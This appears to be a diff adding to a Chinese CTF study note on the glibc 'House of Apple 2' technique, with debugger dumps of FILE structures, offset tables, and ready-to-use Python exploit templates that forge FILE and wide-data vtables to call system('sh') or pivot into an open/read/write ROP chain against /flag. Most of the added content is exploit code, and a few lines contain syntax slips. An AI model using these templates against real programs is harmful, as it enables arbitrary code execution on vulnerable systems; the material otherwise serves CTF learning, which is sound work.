@@ -414,3 +414,340 @@ fake_wide_vtable = fake_wide_vtable.ljust(0x60,b'\x00')
 fake_wide_vtable += p64(libcbase+0x17923D)		#libc 2.39中svcudp_reply的gadget
 
 ```
+
+```c
+pwndbg> p *_IO_list_all
+$1 = {
+  file = {
+    _flags = -72540026,
+    _IO_read_ptr = 0x0,
+    _IO_read_end = 0x0,
+    _IO_read_base = 0x0,
+    _IO_write_base = 0x0,
+    _IO_write_ptr = 0x0,
+    _IO_write_end = 0x0,
+    _IO_buf_base = 0x0,
+    _IO_buf_end = 0x0,
+    _IO_save_base = 0x0,
+    _IO_backup_base = 0x0,
+    _IO_save_end = 0x0,
+    _markers = 0x0,
+    _chain = 0x7ffff7fb4760 <_IO_2_1_stdout_>,
+    _fileno = 2,
+    _flags2 = 0,
+    _old_offset = -1,
+    _cur_column = 0,
+    _vtable_offset = 0 '\000',
+    _shortbuf = "",
+    _lock = 0x7ffff7fb6720 <_IO_stdfile_2_lock>,
+    _offset = -1,
+    _codecvt = 0x0,
+    _wide_data = 0x7ffff7fb3880 <_IO_wide_data_2>,
+    _freeres_list = 0x0,
+    _freeres_buf = 0x0,
+    __pad5 = 0,
+    _mode = 0,
+    _unused2 = '\000' <repeats 19 times>
+  },
+  vtable = 0x7ffff7fb5560 <__GI__IO_file_jumps>
+}
+
+pwndbg> p _IO_wide_data_2
+$2 = {
+  _IO_read_ptr = 0x0,
+  _IO_read_end = 0x0,
+  _IO_read_base = 0x0,
+  _IO_write_base = 0x0,
+  _IO_write_ptr = 0x0,
+  _IO_write_end = 0x0,
+  _IO_buf_base = 0x0,
+  _IO_buf_end = 0x0,
+  _IO_save_base = 0x0,
+  _IO_backup_base = 0x0,
+  _IO_save_end = 0x0,
+  _IO_state = {
+    __count = 0,
+    __value = {
+      __wch = 0,
+      __wchb = "\000\000\000"
+    }
+  },
+  _IO_last_state = {
+    __count = 0,
+    __value = {
+      __wch = 0,
+      __wchb = "\000\000\000"
+    }
+  },
+  _codecvt = {
+    __cd_in = {
+      step = 0x0,
+      step_data = {
+        __outbuf = 0x0,
+        __outbufend = 0x0,
+        __flags = 0,
+        __invocation_counter = 0,
+        __internal_use = 0,
+        __statep = 0x0,
+        __state = {
+          __count = 0,
+          __value = {
+            __wch = 0,
+            __wchb = "\000\000\000"
+          }
+        }
+      }
+    },
+    __cd_out = {
+      step = 0x0,
+      step_data = {
+        __outbuf = 0x0,
+        __outbufend = 0x0,
+        __flags = 0,
+        __invocation_counter = 0,
+        __internal_use = 0,
+        __statep = 0x0,
+        __state = {
+          __count = 0,
+          __value = {
+            __wch = 0,
+            __wchb = "\000\000\000"
+          }
+        }
+      }
+    }
+  },
+  _shortbuf = L"",
+  _wide_vtable = 0x7ffff7fb5020 <__GI__IO_wfile_jumps>
+}
+```
+
+| **偏移 (Hex)**    IO_FILE | **字段名**        | **类型/描述**                                                |
+| ------------------------- | ----------------- | ------------------------------------------------------------ |
+| **0x00**                  | `_flags`          | 标志位 (如 `_IO_MAGIC_GET`)                                  |
+| **0x08**                  | `_IO_read_ptr`    | 读缓冲区指针                                                 |
+| **0x10**                  | `_IO_read_end`    | 读缓冲区结束                                                 |
+| **0x18**                  | `_IO_read_base`   | 读缓冲区基址                                                 |
+| **0x20**                  | `_IO_write_base`  | 写缓冲区基址                                                 |
+| **0x28**                  | `_IO_write_ptr`   | 写缓冲区指针 (House of Apple 2 中需满足 ptr > base)          |
+| **0x30**                  | `_IO_write_end`   | 写缓冲区结束                                                 |
+| **0x38**                  | `_IO_buf_base`    | 缓冲区基址                                                   |
+| **0x40**                  | `_IO_buf_end`     | 缓冲区结束                                                   |
+| **0x48**                  | `_IO_save_base`   | 备份缓冲区基址                                               |
+| **0x50**                  | `_IO_backup_base` | 备份缓冲区基址                                               |
+| **0x58**                  | `_IO_save_end`    | 备份缓冲区结束                                               |
+| **0x60**                  | `_markers`        | 链表标记                                                     |
+| **0x68**                  | `_chain`          | 链接下一个 FILE 结构体                                       |
+| **0x70**                  | `_fileno`         | 文件描述符                                                   |
+| **0x74**                  | `_flags2`         | 附加标志                                                     |
+| **0x78**                  | `_old_offset`     | 旧的偏移量                                                   |
+| **0x80**                  | `_cur_column`     | 当前列                                                       |
+| **0x82**                  | `_vtable_offset`  | vtable 偏移 (通常为 0)                                       |
+| **0x83**                  | `_shortbuf[1]`    | 短缓冲区                                                     |
+| **0x88**                  | `_lock`           | **关键字段**：必须指向一块可写内存（通常指向文件本身的空闲位置） |
+| **0x90**                  | `_offset`         | 偏移量                                                       |
+| **0x98**                  | `_codecvt`        | 编码转换指针                                                 |
+| **0xa0**                  | `_wide_data`      | **关键字段**：指向 `_IO_wide_data` 结构体                    |
+| **0xa8**                  | `_freeres_list`   | 释放列表                                                     |
+| **0xb0**                  | `_freeres_buf`    | 释放缓冲区                                                   |
+| **0xb8**                  | `__pad5`          | 填充                                                         |
+| **0xc0**                  | `_mode`           | **关键字段**：House of Apple 2 中通常设为大于 0              |
+| **0xc4**                  | `_unused2[20]`    | 未使用区域                                                   |
+| **0xd8**                  | `vtable`          | **关键字段**：指向 `_IO_wfile_jumps` 以触发攻击流            |
+
+| **偏移 (Hex)**     vtable | **函数名 (Entry)** | **House of Apple 2 中的作用**                  |
+| ------------------------- | ------------------ | ---------------------------------------------- |
+| **0x00**                  | `dummy`            | 占位                                           |
+| **0x08**                  | `dummy2`           | 占位                                           |
+| **0x10**                  | `finish`           | 析构                                           |
+| **0x18**                  | `overflow`         | **核心触发点**：通过 `_IO_wfile_overflow` 进入 |
+| **0x20**                  | `underflow`        |                                                |
+| **0x28**                  | `uflow`            |                                                |
+| **0x30**                  | `pbackfail`        |                                                |
+| **0x38**                  | `xsputn`           | 输出字符串                                     |
+| **0x40**                  | `xsgetn`           | 输入字符串                                     |
+| **0x48**                  | `seekoff`          | 偏移寻址                                       |
+| **0x50**                  | `seekpos`          | 位置寻址                                       |
+| **0x58**                  | `setbuf`           | 设置缓冲区                                     |
+| **0x60**                  | `sync`             | 同步                                           |
+| **0x68**                  | `doallocate`       | 分配缓冲区                                     |
+| **0x70**                  | `read`             | 系统读                                         |
+| **0x78**                  | `write`            | 系统写                                         |
+| **0x80**                  | `seek`             | 系统寻址                                       |
+| **0x88**                  | `close`            | 关闭                                           |
+| **0x90**                  | `stat`             | 状态信息                                       |
+| **0x98**                  | `showmanyc`        |                                                |
+| **0xa0**                  | `imbue`            |                                                |
+
+| **偏移 (Hex) ** _wide_data | **字段名**        | **类型**              | **在 House of Apple 2 中的作用 / 备注**                      |
+| -------------------------- | ----------------- | --------------------- | ------------------------------------------------------------ |
+| **0x00**                   | `_IO_read_ptr`    | `wchar_t *`           | 宽字符读指针                                                 |
+| **0x08**                   | `_IO_read_end`    | `wchar_t *`           | 宽字符读缓冲区结束                                           |
+| **0x10**                   | `_IO_read_base`   | `wchar_t *`           | 宽字符读缓冲区基址                                           |
+| **0x18**                   | `_IO_write_base`  | `wchar_t *`           | **关键条件 1**：通常必须设置为 `0`，用来满足进入 `_IO_wdoallocbuf` 分配宽缓冲区的判定条件（即缓冲区未初始化）。 |
+| **0x20**                   | `_IO_write_ptr`   | `wchar_t *`           | 宽字符写指针                                                 |
+| **0x28**                   | `_IO_write_end`   | `wchar_t *`           | 宽字符写缓冲区结束                                           |
+| **0x30**                   | `_IO_buf_base`    | `wchar_t *`           | **关键条件 2**：通常必须设置为 `0`，用于绕过 `_IO_wdoallocbuf` 开头的 `if (fp->_wide_data->_IO_buf_base) return;` 检查。 |
+| **0x38**                   | `_IO_buf_end`     | `wchar_t *`           | 宽字符备用缓冲区结束                                         |
+| **0x40**                   | `_IO_save_base`   | `wchar_t *`           | 备份缓冲区相关                                               |
+| **0x48**                   | `_IO_backup_base` | `wchar_t *`           | 备份缓冲区相关                                               |
+| **0x50**                   | `_IO_save_end`    | `wchar_t *`           | 备份缓冲区相关                                               |
+| **0x58**                   | `_IO_state`       | `__mbstate_t`         | 多字节字符转换状态 (8 字节)                                  |
+| **0x60**                   | `_IO_last_state`  | `__mbstate_t`         | 上一次转换状态 (8 字节)                                      |
+| **0x68**                   | `_codecvt`        | `struct _IO_codecvt`  | 编码转换结构体。它包含了一大堆函数指针和状态标志（占用 0x68 到 0xd8 的大部分空间）。在 Pwn 中通常用不到，直接用 `\x00` 填充即可。 |
+| **0xe0**                   | `_wide_vtable`    | `struct _IO_jump_t *` | **绝对核心**：指向你伪造的宽字符虚表（`_wide_vtable`），程序最终会去该指针指向的地址 + `0x68` (`__doallocate`) 的位置寻址并执行指令。 |
+
+| **偏移 (Hex)**   _wide_data_vtable | **字段 / 对应的宏** | **House of Apple 2 劫持细节与作用**                          |
+| ---------------------------------- | ------------------- | ------------------------------------------------------------ |
+| **0x00**                           | `__dummy`           | 占位符，通常填 0。                                           |
+| **0x08**                           | `__dummy2`          | 占位符，通常填 0。                                           |
+| **0x10**                           | `__finish`          | `_IO_WFINISH`                                                |
+| **0x18**                           | `__overflow`        | `_IO_WOVERFLOW`                                              |
+| **0x20**                           | `__underflow`       | `_IO_WUNDERFLOW`                                             |
+| **0x28**                           | `__uflow`           | `_IO_WUFLOW`                                                 |
+| **0x30**                           | `__pbackfail`       | `_IO_WPBACKFAIL`                                             |
+| **0x38**                           | `__xsputn`          | `_IO_WXSPUTN`                                                |
+| **0x40**                           | `__xsgetn`          | `_IO_WXSGETN`                                                |
+| **0x48**                           | `__seekoff`         | `_IO_WSEEKOFF`                                               |
+| **0x50**                           | `__seekpos`         | `_IO_WSEEKPOS`                                               |
+| **0x58**                           | `__setbuf`          | `_IO_WSETBUF`                                                |
+| **0x60**                           | `__sync`            | `_IO_WSYNC`                                                  |
+| **0x68**                           | `__doallocate`      | **绝对核心劫持点 (`_IO_WDOALLOCATE`)**。在这里填入 `system`、`magic gadget` 或 `setcontext` 的地址。 |
+| **0x70**                           | `__read`            | `_IO_WREAD`                                                  |
+| **0x78**                           | `__write`           | `_IO_WWRITE`                                                 |
+| **0x80**                           | `__seek`            | `_IO_WSEEK`                                                  |
+| **0x88**                           | `__close`           | `_IO_WCLOSE`                                                 |
+| **0x90**                           | `__stat`            | `_IO_WSTAT`                                                  |
+| **0x98**                           | `__showmanyc`       | `_IO_WSHOWMANYC`                                             |
+| **0xa0**                           | `__imbue`           | `_IO_WIMBUE`                                                 |
+
+
+
+对`fp`的设置如下：
+
+- `_flags`设置为`~(2 | 0x8 | 0x800)`，如果不需要控制`rdi`，设置为`0`即可；如果需要获得`shell`，可设置为` sh;`，注意前面有两个空格
+- `_lock`设置为可控地址用来通过校验
+- `vtable`设置为`_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap`地址（加减偏移），使其能成功调用`_IO_wfile_overflow`即可
+- `_wide_data`设置为可控堆地址`A`，即满足`*(fp + 0xa0) = A`
+- `_wide_data->_IO_write_base`设置为`0`，即满足`*(A + 0x18) = 0`
+- `_wide_data->_IO_buf_base`设置为`0`，即满足`*(A + 0x30) = 0`
+- `_wide_data->_wide_vtable`设置为可控堆地址`B`，即满足`*(A + 0xe0) = B`
+- `_wide_data->_wide_vtable->doallocate`设置为地址`C`用于劫持`RIP`，即满足`*(B + 0x68) = C`
+
+### 真正的板子
+
+#### system
+
+```python
+fp_addr = heap + 0x500
+_wide_data_addr = fp_addr + 0x100
+_wide_data_vtable_addr = _wide_data_addr + 0xe8 - 0x68      #   0x80
+
+
+fp = IO_FILE_plus_struct()
+fp.flags = 0
+fp._lock = heap + 0x200
+fp._wide_data = _wide_data_addr
+fp.vtable = libc.sym['_IO_wfile_jumps']
+
+fake_io = flat(
+    {
+        0x0:fp,
+        
+        0x100:{
+            0x18:0,     #_IO_write_base设置为0
+            0x30:0,     #_IO_buf_base设置为0
+            0xe0:_wide_data_vtable_addr,       #_wide_vtable设置为可控堆地址
+        },
+        
+        0x180:{
+            0x68:libc.sym['system']        #`_wide_data->_wide_vtable->doallocate`设置为地址`C`用于劫持`RIP`
+        }
+        0x200: b'  sh;'
+    }
+)
+
+```
+
+#### 栈迁移 2.35
+
+```python
+fp_addr = heap_base+0x1810
+_wide_data_addr = fp_addr + 0x100
+_wide_data_vtable_addr = _wide_data_addr + 0xe8 - 0x68      #   0x80
+ROPchain_addr = fp_addr+0x400
+leave_ret = libc.search(asm("leave;ret;")).__next__()
+
+fp = IO_FILE_plus_struct()0x
+fp.flags = b'  /flag\x00'
+fp._IO_read_ptr = 0xa81
+fp._lock = heap + 0x200
+fp._wide_data = _wide_data_addr
+fp.vtable = libc.sym['_IO_wfile_jumps']
+fp._IO_save_base = fp_addr + 0x300         # rdi+0x48   -->     rbp
+
+
+ROPchain = flat([
+                    pop_rdx_rbx_ret,
+                    0,
+                    fp_addr + 0x300, 
+                    pop_rdx_rbx_ret,
+                    leave_ret,0,
+                    pop_rdx_rbx_ret,
+                    0,0,
+                    pop_rdi_ret,
+                    fp_addr+2,
+                    pop_rsi_ret,
+                    0,
+                    libc.sym['open'],
+                    pop_rdi_ret,
+                    3,
+                    pop_rsi_ret,
+                    heap + 0x300,
+                    pop_rdx_rbx_ret,
+                    0x100,0,
+                    libc.sym['read'],
+                    pop_rdi_ret,
+                    1,
+                    pop_rsi_ret,
+                    heap + 0x300,
+                    pop_rdx_rbx_ret,
+                    0x100,0,
+                    libc.sym['write'],
+
+                    ])
+
+
+fake_io = flat(
+    {
+        0x8:libc.sym['_IO_list_all']-0x20,
+        0x10:bytes(fp),
+        # 0x48:leave_ret,
+        # 0x50:ROPchain_addr,
+        
+        0x110:{
+            0x18:0,     #_IO_write_base设置为0
+            0x30:0,     #_IO_buf_base设置为0
+            0xe0:_wide_data_vtable_addr,       #_wide_vtable设置为可控堆地址
+            # 0x80+0x60:b'aaaaaaaa',
+            0x80+0x68:libc.sym['svcudp_reply']+26,
+        },
+        
+        # 0x110+0x80:{
+        #     # 0x60:b'aaaaaaaa',
+        #     # 0x68:libc.sym['setcontext']+26,    #`_wide_data->_wide_vtable->doallocate`设置为地址`C`用于劫持`RIP`
+        # },
+        0xa90:[0,0xab1],
+        # 0x320+0x28:leave_ret,
+        # 0x328:fp_addr + 0x300,      #   rax -->   rbp+0x18
+        # 0x310+0x28:leave_ret,
+        0x318:ROPchain,
+    },
+    filler=b'\x00'
+)
+```
+
+
+
+
+
